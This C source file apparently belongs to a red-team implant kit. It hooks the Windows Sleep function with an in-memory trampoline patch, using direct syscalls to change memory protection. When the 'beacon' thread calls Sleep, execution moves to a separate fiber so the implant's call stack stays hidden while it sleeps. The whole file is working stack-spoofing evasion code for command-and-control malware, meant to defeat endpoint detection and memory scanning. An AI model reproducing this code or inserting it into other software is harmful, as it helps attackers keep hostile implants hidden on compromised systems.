#include <intrin.h>
#include <winnt.h>
#include <stdint.h>

int fastTrampoline(BYTE * addressToHook, LPVOID jumpAddress, int hook);

typedef DWORD(NTAPI* typeNtFlushInstructionCache)(
   HANDLE ProcessHandle,
   PVOID BaseAddress,
   ULONG NumberOfBytesToFlush
);

struct HookedSleep {
    DWORD dwSize;
    BYTE original[16];
    BYTE trampoline[16];
};

struct HookedSleep g_hookedSleep;
LPVOID mFiber=NULL;
DWORD beacon_threadid;

void MySleep( DWORD dwMilliseconds ) {
/* disable warning -Warray-bounds caused by the GetFiberData function */
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Warray-bounds"
    DWORD *milliseconds = (DWORD*)GetFiberData();
#pragma GCC diagnostic pop

    WaitForSingleObject(GetCurrentProcess(), *milliseconds);

    SwitchToFiber(mFiber);
}

void WINAPI MySleepFiber(DWORD ms) {

    if (GetCurrentThreadId() == beacon_threadid) {
        // unhook Sleep
        fastTrampoline((BYTE*)Sleep, (void*)&MySleepFiber, 0);

        if ( mFiber == NULL) {
           mFiber = ConvertThreadToFiber(NULL);
        }

        DWORD sleepTime = ms;
        LPVOID anotherFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)MySleep, &sleepTime);
        SwitchToFiber(anotherFiber);
        DeleteFiber(anotherFiber);

        // hook Sleep
        fastTrampoline((BYTE*)Sleep, (void*)&MySleepFiber, 1);
    }
    else {
        SleepEx(ms , 0);
    }
}

int fastTrampoline(BYTE * addressToHook, LPVOID jumpAddress, int hook) {

    // Initialize global structures once, hook == 2 only called from set_stack_spoof_code
    if (hook == 2) {
        // Initialize the hooked sleep buffers with original code.
        g_hookedSleep.dwSize = sizeof(g_hookedSleep.original);
        memcpy(g_hookedSleep.original,   addressToHook, g_hookedSleep.dwSize);
        memcpy(g_hookedSleep.trampoline, addressToHook, g_hookedSleep.dwSize);

        // Setup the trampoline hook to use
#ifdef _WIN64
        uint8_t trampoline[] = {
            0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, addr
            0x41, 0xFF, 0xE2                                            // jmp r10
        };

        uint64_t addr = (uint64_t)(jumpAddress);
        memcpy(&trampoline[2], &addr, sizeof(addr));
        memcpy(g_hookedSleep.trampoline, trampoline, sizeof(trampoline));
#else
        uint8_t trampoline[] = {
            0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, addr
            0xFF, 0xE0                        // jmp eax
        };

        uint32_t addr = (uint32_t)(jumpAddress);
        memcpy(&trampoline[1], &addr, sizeof(addr));
        memcpy(g_hookedSleep.trampoline, trampoline, sizeof(trampoline));
#endif
    }

    DWORD dwSize = g_hookedSleep.dwSize;
    DWORD oldProt = 0;

#if USE_SYSCALLS == 1
    SIZE_T size = dwSize;
    PVOID  tmpAddrToHook = (PVOID) addressToHook;
    if (0 != NtProtectVirtualMemory(GetCurrentProcess(), (PVOID) &tmpAddrToHook, &size, PAGE_EXECUTE_READWRITE, &oldProt)) {
#else
    if (!VirtualProtect(addressToHook, dwSize, PAGE_EXECUTE_READWRITE, &oldProt)) {
#endif
        // Unable to make memory writable nothing more we can do.
        return 0;
    }

    // Copy the either the trampoline or original code at the addressToHook location.
    memcpy(addressToHook, hook ? g_hookedSleep.trampoline : g_hookedSleep.original, dwSize);

    // We're flushing instructions cache just in case our hook didn't kick in immediately.
#if USE_SYSCALLS == 1
    NtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwSize);
#else
    static typeNtFlushInstructionCache pNtFlushInstructionCache = NULL;
    if (!pNtFlushInstructionCache) {
        pNtFlushInstructionCache = (typeNtFlushInstructionCache)
            GetProcAddress(GetModuleHandleA("ntdll"), "NtFlushInstructionCache");
    }
    if (pNtFlushInstructionCache) {
        pNtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwSize);
    }
#endif

    // Switch memory back to its original protection state.
#if USE_SYSCALLS == 1
    size = dwSize;
    tmpAddrToHook = (PVOID) addressToHook;
    NtProtectVirtualMemory(GetCurrentProcess(), (PVOID) &tmpAddrToHook, &size, oldProt, &oldProt);
#else
    VirtualProtect(addressToHook, dwSize, oldProt, &oldProt);
#endif
    return 1;
}

int set_stack_spoof_code()
{
    return fastTrampoline((BYTE*)Sleep, (void*)&MySleepFiber, 2);
}
